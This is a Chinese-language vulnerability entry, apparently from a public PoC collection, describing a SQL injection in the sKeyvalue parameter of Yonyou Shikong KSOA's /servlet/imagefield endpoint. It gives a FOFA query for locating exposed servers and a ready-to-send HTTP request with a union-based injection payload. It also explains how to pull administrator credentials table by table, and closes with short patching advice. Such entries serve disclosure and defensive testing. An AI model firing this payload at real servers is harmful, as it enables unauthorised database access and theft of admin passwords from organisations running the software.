---
fofa: "app=\"用友-时空KSOA\""
source: "OA-EXPTOOL/Lucifer1993 + afrog-pocs/zan8in"
---

# 用友 时空KSOA servletimagefield sKeyvalue SQL注入漏洞

# 漏洞描述

用友时空 KSOA /servlet/imagefield 接口 sKeyvalue 参数存在 SQL 注入漏洞。攻击者可通过联合注入直接回显提取数据库内容，如管理员表字段数据。

# 影响版本

用友时空 KSOA

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-时空KSOA"

POC/EXP：

```
GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

通过 sTablename/sKeyname/sKeyvalue 三个参数指定任意表、字段与条件，利用 union 联合注入将查询结果（如 md5 值）直接回显在响应中，可逐字段拖取管理员账号密码等敏感数据。

# 漏洞修复

联系用友官方获取安全补丁，对 sKeyvalue 等外部输入参数使用预编译语句并做严格过滤。
